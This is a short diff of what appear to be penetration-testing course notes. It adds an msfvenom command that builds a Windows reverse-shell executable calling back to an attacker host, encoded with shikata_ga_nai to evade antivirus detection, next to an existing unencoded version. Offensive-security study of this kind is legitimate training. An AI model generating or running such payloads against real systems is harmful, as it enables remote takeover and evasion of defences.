@@ -2653,7 +2653,9 @@ In production environments, domains typically have more than one domain controll
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe
   # -p <payload>, params, -f <output-format>, -o <output file name>
 file rhell_reverse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
       #+end_src
+      // p697
 
 
 * TODO list
